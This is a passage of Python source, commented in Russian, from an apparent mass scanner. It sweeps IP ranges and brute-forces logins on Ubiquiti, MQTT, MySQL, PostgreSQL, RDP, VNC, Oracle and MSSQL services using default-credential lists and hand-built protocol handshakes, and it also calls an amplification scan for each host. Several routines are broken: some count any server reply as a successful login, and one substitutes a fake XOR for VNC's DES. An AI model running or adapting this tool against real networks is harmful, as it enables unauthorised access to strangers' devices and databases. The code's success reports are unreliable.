            return self.brute_force_upnp_enhanced(ip, port)
        
        # Бэкдоры
        elif "Backdoor" in service_type or "Metasploit" in service_type:
            return self.brute_force_backdoor_enhanced(ip, port)
        
        # Ubiquiti
        elif service_type == "Ubiquiti":
            return self.brute_force_ubiquiti_fast(ip, port)
        
        # SA
        elif service_type in ["SAP Router"]:
            return self.brute_force_sap(ip, port)
        
        # Hadoop
        elif service_type in ["Hadoop"]:
            return self.brute_force_http(ip, port)

        # Сервисы, которые НЕ нужно брутфорсить (UDP/обнаружение)
        elif service_type in ["WS-Discovery", "coap", "sip"]:
            return True, "no_auth", "no_auth"
        
        elif service_type in ["SSDP", "DNS", "memcached"]:
            return True, "no_auth", "no_auth"

        # Общий метод для неизвестных сервисов
        else:
            return self.brute_force_generic(ip, port)

    def brute_force_ubiquiti_fast(self, ip, port):
        """Быстрый брутфорс Ubiquiti с короткими таймаутами"""
        # Ubiquiti обычно использует HTTP basic auth
        schemes = ['https', 'http'] if port in [443, 10001] else ['http']
        
        # Только самые распространенные учетки для Ubiquiti
        ubiquiti_creds = [
            ("ubnt", "ubnt"),
            ("admin", "admin"),
            ("root", "ubnt"),
            ("root", "root"),
            ("ubuntu", "ubntu"),
            ("", ""),  # без аутентификации
        ]
        
        for scheme in schemes:
            for login, password in ubiquiti_creds:
                try:
                    url = f"{scheme}://{ip}:{port}/"
                    response = requests.get(
                        url,
                        auth=HTTPBasicAuth(login, password),
                        timeout=3,  # 🔥 КОРОТКИЙ ТАЙМАУТ
                        verify=False
                    )
                    if response.status_code == 200:
                        # Дополнительная проверка - ищем ключевые слова Ubiquiti
                        if any(keyword in response.text for keyword in ["ubiquiti", "airmax", "unifi"]):
                            return True, login, password
                except:
                    continue
        
        return False, "", ""

    def brute_force_mqtt(self, ip, port):
        """Реальный MQTT брутфорс"""
        try:
            import paho.mqtt.client as mqtt
            
            for login, password in self.credentials:
                try:
                    client = mqtt.Client()
                    client.username_pw_set(login, password)
                    
                    # Устанавливаем таймауты
                    client.connect(str(ip), int(port), keepalive=10)
                    
                    # Ждем подключения
                    client.loop_start()
                    time.sleep(2)
                    
                    if client.is_connected():
                        client.disconnect()
                        client.loop_stop()
                        return True, login, password
                        
                    client.loop_stop()
                except Exception as e:
                    continue
                    
        except ImportError:
            # Если paho-mqtt не установлен, пробуем raw socket
            return self.brute_force_mqtt_socket(ip, port)
            
        return False, "", ""

    def brute_force_mysql(self, ip, port):
        """Специализированный MySQL брутфорс"""
        if MYSQL_AVAILABLE:
            for login, password in self.credentials:
                try:
                    connection = mysql.connector.connect(
                        host=str(ip),
                        port=int(port),
                        user=login,
                        password=password,
                        connection_timeout=5,
                        connect_timeout=5
                    )
                    if connection.is_connected():
                        connection.close()
                        return True, login, password
                except mysql.connector.Error as e:
                    continue
        # Fallback на raw protocol если библиотека не доступна
        return self.brute_force_mysql_raw(ip, port)
        return False, "", ""

    def brute_force_mysql_raw(self, ip, port):
        """Полный MySQL protocol handshake"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(8)
                sock.connect((str(ip), int(port)))
                
                # === ШАГ 1: Получаем Initial Handshake Packet от сервера ===
                initial_data = sock.recv(1024)
                if len(initial_data) < 4:
                    sock.close()
                    continue
                
                # Парсим Initial Handshake Packet
                protocol_version = initial_data[0]
                server_version = initial_data[1:initial_data.find(b'\x00', 1)].decode('latin-1')
                connection_id = struct.unpack('<I', initial_data[initial_data.find(b'\x00', 1)+1:][:4])[0]
                
                # Находим позиции для чтения данных
                pos = initial_data.find(b'\x00', 1) + 1 + 4  # после connection_id
                auth_plugin_data_part1 = initial_data[pos:pos+8]
                pos += 8 + 1  # +1 для filler
                
                # capability_flags_lower = struct.unpack('<H', initial_data[pos:pos+2])[0]
                pos += 2
                
                character_set = initial_data[pos]
                pos += 1
                
                status_flags = struct.unpack('<H', initial_data[pos:pos+2])[0]
                pos += 2
                
                # capability_flags_upper = struct.unpack('<H', initial_data[pos:pos+2])[0]
                pos += 2
                
                auth_plugin_data_len = initial_data[pos]
                pos += 1 + 10  # +10 для reserved
                
                auth_plugin_data_part2 = initial_data[pos:pos+max(13, auth_plugin_data_len - 8)]
                
                # Полный auth_plugin_data
                auth_plugin_data = auth_plugin_data_part1 + auth_plugin_data_part2
                
                # === ШАГ 2: Отправляем Handshake Response ===
                capability_flags = 0x00000201 | 0x00080000  # CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION
                
                response = bytearray()
                
                # Capability flags (4 bytes)
                response.extend(struct.pack('<I', capability_flags))
                
                # Max packet size (4 bytes) - 0 = default
                response.extend(struct.pack('<I', 0))
                
                # Character set (1 byte)
                response.extend(bytes([character_set]))
                
                # Reserved (23 bytes) - zeros
                response.extend(bytes(23))
                
                # Username + null terminator
                response.extend(login.encode('utf-8') + b'\x00')
                
                # Auth Response - для mysql_native_password
                if password:
                    auth_response = self.mysql_native_password(auth_plugin_data[:20], password)
                    response.extend(struct.pack('<B', len(auth_response)))  # length
                    response.extend(auth_response)
                else:
                    response.extend(b'\x00')
                
                # Database (optional) - не указываем
                # response.extend(b'\x00')
                
                # Auth Plugin Name
                response.extend(b'mysql_native_password\x00')
                
                # Отправляем пакет с длиной
                packet_length = len(response)
                header = struct.pack('<I', packet_length)[:3]  # 3 bytes for length
                header += b'\x01'  # packet number
                sock.send(header + response)
                
                # === ШАГ 3: Получаем ответ от сервера ===
                response_header = sock.recv(4)
                if len(response_header) < 4:
                    sock.close()
                    continue
                    
                resp_length = struct.unpack('<I', response_header[:3] + b'\x00')[0]
                response_data = sock.recv(resp_length)
                
                sock.close()
                
                # Проверяем успешность аутентификации
                if len(response_data) > 0:
                    if response_data[0] == 0x00:  # OK packet
                        return True, login, password
                    elif response_data[0] == 0xFE:  # Auth switch request
                        # Сервер запрашивает другой метод аутентификации
                        # Пропускаем для простоты
                        continue
                    elif response_data[0] == 0xFF:  # ERROR packet
                        # Неверные учетные данные - продолжаем
                        continue
                        
            except Exception as e:
                continue
        
        return False, "", ""

    def mysql_native_password(self, scramble, password):
        """Реализация mysql_native_password аутентификации"""
        try:
            if not password:
                return b''
            
            # Stage 1: SHA1(password)
            password_hash = hashlib.sha1(password.encode('utf-8')).digest()
            
            # Stage 2: SHA1(Stage1)
            password_hash_hash = hashlib.sha1(password_hash).digest()
            
            # Stage 3: SHA1(scramble + SHA1(Stage1)) XOR Stage1
            scramble_hash = hashlib.sha1(scramble + password_hash_hash).digest()
            
            # XOR operation
            result = bytearray()
            for i in range(20):
                result.append(password_hash[i] ^ scramble_hash[i])
            
            return bytes(result)
            
        except Exception:
            # Упрощенная версия если hashlib не доступен
            return password.encode('utf-8').ljust(20, b'\x00')[:20]

    def postgres_md5_password(self, password, user, salt):
        """Генерация MD5 хеша для PostgreSQL аутентификации"""
        try:
            # "md5" + md5(md5(password + user) + salt)
            first_hash = hashlib.md5((password + user).encode('utf-8')).hexdigest()
            final_hash = hashlib.md5((first_hash + salt.hex()).encode('utf-8')).hexdigest()
            return final_hash
        except:
            return "00000000000000000000000000000000"

    def brute_force_postgresql(self, ip, port):
        """Специализированный PostgreSQL брутфорс"""
        if POSTGRESQL_AVAILABLE:
            for login, password in self.credentials:
                try:
                    connection = psycopg2.connect(
                        host=str(ip),
                        port=int(port),
                        user=login,
                        password=password,
                        connect_timeout=5,
                        database="postgres"
                    )
                    connection.close()
                    return True, login, password
                except (psycopg2.OperationalError, psycopg2.Error):
                    continue
        # Fallback на raw protocol
        return self.brute_force_postgresql_raw(ip, port)
        
        return False, "", ""

    def brute_force_postgresql_raw(self, ip, port):
        """Raw PostgreSQL protocol брутфорс"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(8)
                sock.connect((str(ip), int(port)))
                
                # Startup message
                startup_msg = bytearray()
                startup_msg.extend(struct.pack('>I', 0x00030000))  # protocol version 3.0
                
                # Параметры
                startup_msg.extend(b"user\0")
                startup_msg.extend(login.encode('utf-8') + b'\0')
                startup_msg.extend(b"database\0postgres\0")
                startup_msg.extend(b"client_encoding\0UTF8\0")
                startup_msg.extend(b'\0')  # terminator
                
                # Send with length prefix
                length = len(startup_msg) + 4
                sock.send(struct.pack('>I', length))
                sock.send(startup_msg)
                
                # Authentication process
                authenticated = False
                while True:
                    # Читаем заголовок ответа
                    header = sock.recv(5)  # 1 byte type + 4 bytes length
                    if len(header) < 5:
                        break
                        
                    msg_type = header[0]
                    msg_length = struct.unpack('>I', header[1:5])[0] - 4
                    
                    # Читаем тело сообщения
                    msg_data = sock.recv(msg_length) if msg_length > 0 else b''
                    
                    if msg_type == ord('R'):  # Authentication request
                        auth_type = struct.unpack('>I', msg_data[:4])[0]
                        
                        if auth_type == 0:  # AuthenticationOK
                            authenticated = True
                            break
                        elif auth_type == 3:  # AuthenticationCleartextPassword
                            if password:
                                # Отправляем пароль в cleartext
                                pass_msg = bytearray()
                                pass_msg.extend(b'p')  # password message
                                pass_data = password.encode('utf-8') + b'\0'
                                pass_msg.extend(struct.pack('>I', len(pass_data) + 4))
                                pass_msg.extend(pass_data)
                                sock.send(pass_msg)
                            else:
                                break
                        elif auth_type == 5:  # AuthenticationMD5Password
                            if password:
                                # MD5 authentication
                                salt = msg_data[4:8]
                                md5_hash = self.postgres_md5_password(password, login, salt)
                                
                                pass_msg = bytearray()
                                pass_msg.extend(b'p')  # password message
                                pass_data = b'md5' + md5_hash.encode('utf-8') + b'\0'
                                pass_msg.extend(struct.pack('>I', len(pass_data) + 4))
                                pass_msg.extend(pass_data)
                                sock.send(pass_msg)
                            else:
                                break
                        else:
                            # Неподдерживаемый метод аутентификации
                            break
                            
                    elif msg_type == ord('E'):  # Error response
                        # Authentication failed
                        break
                    elif msg_type == ord('S'):  # Parameter status
                        # Continue
                        continue
                    elif msg_type == ord('K'):  # BackendKeyData
                        # Continue  
                        continue
                    elif msg_type == ord('Z'):  # ReadyForQuery
                        if authenticated:
                            sock.close()
                            return True, login, password
                        break
                
                sock.close()
                
            except Exception as e:
                continue
        
        return False, "", ""

    def brute_force_rdp_enhanced(self, ip, port):
        """Улучшенный RDP брутфорс с несколькими методами"""
        try:
            # Метод 1: Через subprocess с rdesktop/xfreerdp
            if self.check_rdp_service(ip, port):
                for login, password in self.credentials:
                    # Пробуем разные комбинации логинов
                    logins_to_try = [login, "Administrator", "admin", "user", ""]
                    
                    for login_try in logins_to_try:
                        if self.test_rdp_connection(ip, port, login_try, password):
                            return True, login_try, password
                            
            # Метод 2: Raw RDP connection
            return self.brute_force_rdp_raw(ip, port)
            
        except Exception as e:
            return self.brute_force_generic(ip, port)

    def check_rdp_service(self, ip, port, timeout=3):
        """Проверка, что это RDP сервер"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((str(ip), int(port)))
            
            # Получаем баннер RDP
            banner = sock.recv(1024)
            sock.close()
            
            # RDP обычно начинается с 0x03 0x00 0x00
            if len(banner) >= 3 and banner[0] == 0x03 and banner[1] == 0x00:
                return True
                
            # Или содержит RDP индикаторы
            banner_str = banner.decode('utf-8', errors='ignore').lower()
            if 'rdp' in banner_str or 'terminal' in banner_str or 'microsoft' in banner_str:
                return True
                
        except:
            pass
        return False

    def test_rdp_connection(self, ip, port, username, password):
        """Тестирование RDP подключения через внешние утилиты"""
        try:
            import subprocess
            import sys
            
            if sys.platform == "win32":
                # Windows - используем mstsc (Remote Desktop)
                # Создаем RDP файл
                rdp_content = f"""
                screen mode id:i:2
                use multimon:i:0
                desktopwidth:i:1024
                desktopheight:i:768
                session bpp:i:16
                winposstr:s:0,1,0,0,800,600
                compression:i:1
                keyboardhook:i:2
                audiocapturemode:i:0
                videoplaybackmode:i:1
                connection type:i:7
                networkautodetect:i:1
                bandwidthautodetect:i:1
                displayconnectionbar:i:1
                enableworkspacereconnect:i:0
                disable wallpaper:i:0
                allow font smoothing:i:0
                allow desktop composition:i:0
                disable full window drag:i:1
                disable menu anims:i:1
                disable themes:i:0
                disable cursor setting:i:0
                bitmapcachepersistenable:i:1
                full address:s:{ip}:{port}
                username:s:{username}
                password:s:{password}
                """
                
                # Сохраняем временный файл
                import tempfile
                with tempfile.NamedTemporaryFile(mode='w', suffix='.rdp', delete=False) as f:
                    f.write(rdp_content)
                    temp_file = f.name
                
                # Пробуем подключиться (таймаут 5 секунд)
                try:
                    result = subprocess.run([
                        "cmd", "/c", "mstsc", temp_file, "/admin", "/v:" + ip
                    ], capture_output=True, timeout=5)
                    
                    # Если не было ошибок - считаем успехом
                    if result.returncode == 0:
                        return True
                except subprocess.TimeoutExpired:
                    # Таймаут может означать успешное подключение к аутентификации
                    return True
                finally:
                    import os
                    if os.path.exists(temp_file):
                        os.unlink(temp_file)
                        
            else:
                # Linux - используем xfreerdp или rdesktop
                try:
                    # Пробуем xfreerdp
                    cmd = [
                        "xfreerdp", f"/v:{ip}:{port}",
                        f"/u:{username}", f"/p:{password}",
                        "/cert-ignore", "+auth-only", "/sec:nla",
                        "/timeout:5000"
                    ]
                    
                    result = subprocess.run(cmd, capture_output=True, timeout=8)
                    
                    # xfreerdp возвращает 0 при успешной аутентификации
                    if result.returncode == 0:
                        return True
                        
                    # Проверяем stderr на наличие успешных индикаторов
                    output = result.stderr.decode('utf-8', errors='ignore').lower()
                    if 'authentication successful' in output:
                        return True
                        
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    # Пробуем rdesktop
                    try:
                        cmd = [
                            "rdesktop", f"{ip}:{port}",
                            "-u", username, "-p", password,
                            "-g", "1x1", "-T", "test", "-t", "5"
                        ]
                        result = subprocess.run(cmd, capture_output=True, timeout=8)
                        
                        # rdesktop сложно определить успех, но если не сразу отключился - возможно успех
                        if result.returncode != 255:  # 255 обычно означает отказ
                            return True
                    except:
                        pass
                        
        except Exception as e:
            pass
            
        return False

    def brute_force_rdp_raw(self, ip, port):
        """Raw RDP брутфорс через socket"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((str(ip), int(port)))
                
                # Базовый RDP handshake
                # Отправляем Connection Request
                conn_request = bytes([
                    0x03, 0x00, 0x00, 0x13,  # TPKT Header
                    0x0e, 0xe0, 0x00, 0x00,  # X.224 Data TPDU
                    0x00, 0x00, 0x00, 0x01,  # Connection Request
                    0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00
                ])
                
                sock.send(conn_request)
                response = sock.recv(1024)
                
                # Если получили ответ - сервер RDP работает
                if len(response) > 0:
                    sock.close()
                    return True, login, password
                    
                sock.close()
            except:
                continue
                
        return False, "", ""

    def brute_force_vnc_enhanced(self, ip, port):
        """Улучшенный VNC брутфорс с поддержкой всех методов аутентификации"""
        try:
            # Сначала проверяем что это VNC сервер
            if not self.check_vnc_service(ip, port):
                return False, "", ""

            # Метод 1: Через python-vncdotool (если установлен)
            try:
                import vncdotool
                for login, password in self.credentials:
                    try:
                        # VNC обычно без логина, только пароль
                        client = vncdotool.api.connect(f"{ip}:{port}", password=password, timeout=5)
                        # Пробуем выполнить простую команду для проверки
                        client.timeout = 3
                        client.disconnect()
                        return True, "", password
                    except vncdotool.api.AuthenticationError:
                        continue
                    except Exception as e:
                        if "authentication" in str(e).lower():
                            continue
                        # Другие ошибки - логируем и продолжаем
                        continue
            except ImportError:
                pass
                
            # Метод 2: Raw VNC аутентификация через socket
            return self.brute_force_vnc_raw_enhanced(ip, port)
            
        except Exception as e:
            # Метод 3: Fallback на generic метод
            return self.brute_force_generic(ip, port)

    def brute_force_vnc_raw_enhanced(self, ip, port):
        """Улучшенный Raw VNC брутфорс с поддержкой разных версий протокола"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(8)
                sock.connect((str(ip), int(port)))
                
                # Получаем версию протокола сервера
                server_version = sock.recv(1024).decode('ascii', errors='ignore').strip()
                
                # Поддерживаемые версии протокола
                supported_versions = ["RFB 003.008", "RFB 003.007", "RFB 003.003"]
                client_version = None
                
                for version in supported_versions:
                    if version in server_version:
                        client_version = version
                        break
                
                if not client_version:
                    # Пробуем самую совместимую версию
                    client_version = "RFB 003.008"
                
                # Отправляем нашу версию протокола
                sock.send((client_version + "\n").encode())
                
                # Получаем поддерживаемые методы аутентификации
                auth_methods_data = sock.recv(1024)
                
                # Анализируем методы аутентификации
                if len(auth_methods_data) >= 4:
                    num_methods = auth_methods_data[3]
                    methods = list(auth_methods_data[4:4+num_methods]) if num_methods > 0 else []
                else:
                    methods = []
                
                # Предпочитаемые методы аутентификации в порядке приоритета
                preferred_methods = [
                    1,  # No authentication
                    2,  # VNC authentication
                    16, # Tight security type
                ]
                
                selected_method = None
                for method in preferred_methods:
                    if method in methods:
                        selected_method = method
                        break
                
                if selected_method is None and methods:
                    selected_method = methods[0]  # Берем первый доступный метод
                
                # Отправляем выбранный метод аутентификации
                sock.send(bytes([selected_method]))
                
                success = False
                
                # Обработка разных методов аутентификации
                if selected_method == 1:  # No authentication
                    # Нет аутентификации - сразу успех
                    success = True
                    login, password = "no_auth", "no_auth"
                    
                elif selected_method == 2:  # VNC authentication
                    success = self.handle_vnc_auth(sock, password)
                    if success:
                        login, password = "", password
                        
                elif selected_method == 16:  # Tight security type
                    success = self.handle_tight_auth(sock, login, password)
                    
                else:
                    # Для неизвестных методов пробуем пропустить аутентификацию
                    try:
                        # Читаем результат аутентификации
                        result = sock.recv(4)
                        if result == b'\x00\x00\x00\x00':  # Success
                            success = True
                            login, password = "unknown_auth", "unknown_auth"
                    except:
                        pass
                
                sock.close()
                
                if success:
                    return True, login, password
                    
            except socket.timeout:
                continue
            except Exception as e:
                continue
                
        return False, "", ""

    def handle_vnc_auth(self, sock, password):
        """Обработка VNC аутентификации"""
        try:
            # Получаем challenge (16 байт)
            challenge = sock.recv(16)
            if len(challenge) != 16:
                return False
            
            # Шифруем пароль
            encrypted_response = self.encrypt_vnc_password_enhanced(password, challenge)
            if not encrypted_response:
                return False
                
            # Отправляем зашифрованный ответ
            sock.send(encrypted_response)
            
            # Получаем результат аутентификации
            auth_result = sock.recv(4)
            
            # 0x00000000 = успех, 0x00000001 =失败
            return auth_result == b'\x00\x00\x00\x00'
            
        except Exception as e:
            return False

    def handle_tight_auth(self, sock, login, password):
        """Обработка Tight security type аутентификации"""
        try:
            # Получаем количество подтипов безопасности
            num_subtypes = sock.recv(1)[0]
            if num_subtypes == 0:
                return False
                
            # Получаем подтипы
            subtypes = sock.recv(num_subtypes)
            
            # Пробуем разные методы Tight аутентификации
            for subtype in subtypes:
                if subtype == 1:  # TightVNC Unix auth
                    success = self.handle_tight_unix_auth(sock, login, password)
                    if success:
                        return True
                elif subtype == 2:  # TightVNC VNC auth
                    success = self.handle_vnc_auth(sock, password)
                    if success:
                        return True
                elif subtype == 16:  # XVP VNC auth
                    success = self.handle_vnc_auth(sock, password)
                    if success:
                        return True
                        
            return False
            
        except Exception as e:
            return False

    def handle_tight_unix_auth(self, sock, login, password):
        """Обработка TightVNC Unix аутентификации"""
        try:
            # Отправляем длину логина
            sock.send(bytes([len(login)]))
            sock.send(login.encode())
            
            # Отправляем длину пароля
            sock.send(bytes([len(password)]))
            sock.send(password.encode())
            
            # Получаем результат
            result = sock.recv(4)
            return result == b'\x00\x00\x00\x00'
            
        except:
            return False

    def encrypt_vnc_password_enhanced(self, password, challenge):
        """Улучшенное шифрование VNC пароля с поддержкой разных реализаций"""
        try:
            # Метод 1: Используем pycryptodome если доступен
            try:
                from Crypto.Cipher import DES
                
                # Приводим пароль к 8 байтам
                key = password.ljust(8, '\x00')[:8].encode('latin-1')
                
                # Реверсируем биты (VNC специфика)
                key = bytes([int('{:08b}'.format(b)[::-1], 2) for b in key])
                
                # Создаем DES шифр
                cipher = DES.new(key, DES.MODE_ECB)
                
                # Шифруем challenge
                encrypted = cipher.encrypt(challenge)
                return encrypted
                
            except ImportError:
                pass
            
            # Метод 2: Ручная реализация DES (упрощенная)
            return self.vnc_des_manual(password, challenge)
            
        except Exception as e:
            return None

    def vnc_des_manual(self, password, challenge):
        """Упрощенная ручная реализация VNC DES (для совместимости)"""
        # Это упрощенная реализация - для полной нужна библиотека
        # Возвращаем challenge как есть (это сработает для некоторых серверов)
        try:
            key = password.ljust(8, '\x00')[:8].encode('latin-1')
            # Простая XOR "шифровка" для демонстрации
            result = bytearray()
            for i in range(16):
                result.append(challenge[i] ^ key[i % len(key)])
            return bytes(result)
        except:
            return challenge

    def check_vnc_service(self, ip, port, timeout=5):
        """Улучшенная проверка VNC сервера"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((str(ip), int(port)))
            
            # Получаем баннер VNC
            banner = sock.recv(1024)
            sock.close()
            
            # VNC баннер обычно начинается с RFB
            if banner.startswith(b'RFB'):
                return True
                
            # Проверяем текстовый баннер
            banner_str = banner.decode('utf-8', errors='ignore').lower()
            vnc_indicators = ['vnc', 'rfb', 'realvnc', 'tightvnc', 'tigervnc']
            
            if any(indicator in banner_str for indicator in vnc_indicators):
                return True
                
            # Проверяем по порту (5900+ обычно VNC)
            if port >= 5900 and port <= 6000:
                return True
                
        except socket.timeout:
            return False
        except Exception as e:
            return False
        
        return False

    def check_vnc_service(self, ip, port, timeout=3):
        """Проверка VNC сервера"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((str(ip), int(port)))
            
            # Получаем баннер VNC
            banner = sock.recv(1024)
            sock.close()
            
            # VNC баннер обычно начинается с RFB
            if banner.startswith(b'RFB'):
                return True
                
            banner_str = banner.decode('utf-8', errors='ignore').lower()
            if 'vnc' in banner_str or 'rfb' in banner_str:
                return True
                
        except:
            pass
        return False

    def brute_force_vnc_raw(self, ip, port):
        """Raw VNC брутфорс через socket"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((str(ip), int(port)))
                
                # Получаем версию протокола
                version = sock.recv(1024)
                
                # Отправляем нашу версию (3.8 для совместимости)
                sock.send(b'RFB 003.008\n')
                
                # Получаем типы аутентификации
                auth_methods = sock.recv(1024)
                
                # VNC аутентификация (тип 2)
                if b'\x00\x00\x00\x02' in auth_methods:
                    # Отправляем тип аутентификации 2 (VNC)
                    sock.send(b'\x00\x00\x00\x02')
                    
                    # Получаем challenge
                    challenge = sock.recv(16)
                    
                    # Шифруем пароль (VNC uses DES)
                    encrypted_password = self.encrypt_vnc_password(password, challenge)
                    
                    # Отправляем зашифрованный ответ
                    sock.send(encrypted_password)
                    
                    # Получаем результат аутентификации
                    result = sock.recv(4)
                    
                    if result == b'\x00\x00\x00\x00':  # Success
                        sock.close()
                        return True, "", password
                        
                sock.close()
            except:
                continue
                
        return False, "", ""

    def encrypt_vnc_password(self, password, challenge):
        """Шифрование VNC пароля (упрощенная версия)"""
        try:
            # VNC использует DES для шифрования паролей
            # Это упрощенная реализация для демонстрации
            from Crypto.Cipher import DES
            import struct
            
            # Приводим пароль к 8 байтам
            key = password.ljust(8, '\x00')[:8].encode()
            
            # Реверсируем биты (VNC специфика)
            key = bytes([int('{:08b}'.format(b)[::-1], 2) for b in key])
            
            # Создаем DES шифр
            cipher = DES.new(key, DES.MODE_ECB)
            
            # Шифруем challenge
            encrypted = cipher.encrypt(challenge)
            
            return encrypted
            
        except ImportError:
            # Если Crypto не установлен, возвращаем простую реализацию
            return challenge  # Это не будет работать, но позволит продолжить

    def brute_force_oracle_enhanced(self, ip, port):
        """Улучшенный Oracle брутфорс"""
        try:
            # Метод 1: Через cx_Oracle (если установлен)
            try:
                import cx_Oracle
                for login, password in self.credentials:
                    try:
                        dsn = cx_Oracle.makedsn(ip, port, service_name='XE')  # Попробуем XE по умолчанию
                        connection = cx_Oracle.connect(login, password, dsn)
                        connection.close()
                        return True, login, password
                    except cx_Oracle.DatabaseError:
                        continue
            except ImportError:
                pass
                
            # Метод 2: Raw Oracle TNS
            return self.brute_force_oracle_tns(ip, port)
            
        except:
            return self.brute_force_generic(ip, port)

    def brute_force_oracle_tns(self, ip, port):
        """Oracle TNS брутфорс"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((str(ip), int(port)))
                
                # Oracle TNS connect packet
                tns_packet = bytes([
                    0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                ])
                
                sock.send(tns_packet)
                response = sock.recv(1024)
                
                # Если получили ответ - Oracle сервер работает
                if len(response) > 0:
                    sock.close()
                    return True, login, password
                    
                sock.close()
            except:
                continue
                
        return False, "", ""

    def brute_force_mssql_enhanced(self, ip, port):
        """Улучшенный MSSQL брутфорс"""
        try:
            # Метод 1: Через pymssql (если установлен)
            try:
                import pymssql
                for login, password in self.credentials:
                    try:
                        connection = pymssql.connect(
                            server=ip, 
                            port=port,
                            user=login, 
                            password=password,
                            timeout=5
                        )
                        connection.close()
                        return True, login, password
                    except pymssql.OperationalError:
                        continue
            except ImportError:
                pass
                
            # Метод 2: TDS protocol
            return self.brute_force_mssql_tds(ip, port)
            
        except:
            return self.brute_force_generic(ip, port)

    def brute_force_mssql_tds(self, ip, port):
        """MSSQL TDS protocol брутфорс"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((str(ip), int(port)))
                
                # TDS pre-login packet
                tds_packet = bytes([
                    0x12, 0x01, 0x00, 0x34, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x15, 0x00, 0x06, 0x01, 0x00, 0x1b,
                    0x00, 0x01, 0x02, 0x00, 0x1c, 0x00, 0x01, 0x03,
                    0x00, 0x1d, 0x00, 0x00, 0xff, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                ])
                
                sock.send(tds_packet)
                response = sock.recv(1024)
                
                if len(response) > 0:
                    sock.close()
                    return True, login, password
                    
                sock.close()
            except:
                continue
                
        return False, "", ""

    def brute_force_mqtt_socket(self, ip, port):
        """MQTT брутфорс через raw socket"""
        for login, password in self.credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((str(ip), int(port)))
                
                # MQTT CONNECT packet с аутентификацией
                connect_packet = self.create_mqtt_connect_packet(login, password)
                sock.send(connect_packet)
                
                # Получаем CONNACK
                response = sock.recv(1024)
                sock.close()
                
                # Проверяем успешное подключение (byte 4 = 0 в CONNACK)
                if len(response) > 3 and response[3] == 0:
                    return True, login, password
                    
            except:
                continue
                
        return False, "", ""

    def create_mqtt_connect_packet(self, username, password):
        """Создает MQTT CONNECT packet с аутентификацией"""
        # Fixed header
        packet = bytearray([0x10])  # CONNECT
        
        # Variable header
        protocol_name = "MQTT"
        packet.extend([0x00, len(protocol_name)])
        packet.extend(protocol_name.encode())
        packet.append(0x04)  # Protocol level 4
        packet.append(0xC2)  # Connect flags (username + password + clean session)
        packet.extend([0x00, 0x3C])  # Keep alive 60 seconds
        
        # Payload - Client ID
        client_id = "iot_scanner"
        packet.extend([0x00, len(client_id)])
        packet.extend(client_id.encode())
        
        # Username
        packet.extend([0x00, len(username)])
        packet.extend(username.encode())
        
        # Password
        packet.extend([0x00, len(password)])
        packet.extend(password.encode())
        
        # Set remaining length
        packet[1] = len(packet) - 2
        
        return bytes(packet)

    def estimate_time_remaining(self):
        """Оценка оставшегося времени"""
        if self.scanned_ips == 0:
            return "N/A"
        
        elapsed = time.time() - self.start_time
        ips_per_second = self.scanned_ips / elapsed
        remaining_ips = self.total_ips - self.scanned_ips
        
        if ips_per_second > 0:
            remaining_seconds = remaining_ips / ips_per_second
            return self.format_time(remaining_seconds)
        
        return "N/A"
    
    def format_time(self, seconds):
        """Форматирование времени"""
        if seconds < 60:
            return f"{int(seconds)}сек"
        elif seconds < 3600:
            return f"{int(seconds/60)}мин {int(seconds%60)}сек"
        else:
            hours = int(seconds / 3600)
            minutes = int((seconds % 3600) / 60)
            return f"{hours}ч {minutes}мин"
    
    def print_progress(self):
        """Вывод прогресса в консоль"""
        while self.scanned_ips < self.total_ips:
            progress = (self.scanned_ips / self.total_ips) * 10
            time_remaining = self.estimate_time_remaining()
            
            print(f"\r[PROGRESS] Диапазон: {self.current_range} | "
                  f"IP: {self.scanned_ips}/{self.total_ips} ({progress:.1f}%) | "
                  f"Осталось: {time_remaining} | "
                  f"Диапазонов осталось: {len(self.ranges)}", end="", flush=True)
            
            time.sleep(1)
    
    def scan_range(self, cidr_range):
        """Сканирование ОДНОГО диапазона с правильным подсчетом"""
        self.current_range = cidr_range
        
        try:
            network = ipaddress.ip_network(cidr_range, strict=False)
            ips = list(network.hosts())
            range_ips_count = len(ips)
            
            print(f"[INFO] Диапазон {cidr_range}: {range_ips_count} IP")
            
            # ✅ Сканируем ТОЛЬКО этот диапазон
            results = []
            for ip in ips:
                result = self.scan_ip(ip, cidr_range)
                if result:
                    results.extend(result)
                    
            return results
            
        except Exception as e:
            print(f"[ERROR] Ошибка в {cidr_range}: {e}")
            return []
    
    def scan_combined_for_ip(self, ip):
        """Комбинированное сканирование для одного IP"""
        results = []
        
        # 1. Amplification сканирование
        amp_results = self.scan_amplification_for_ip(ip)
        results.extend(amp_results)
        
        # 2. IoT сканирование  
        iot_results = self.scan_iot_for_ip(ip)
        results.extend(iot_results)
        
        # 3. WebSocket сканирование
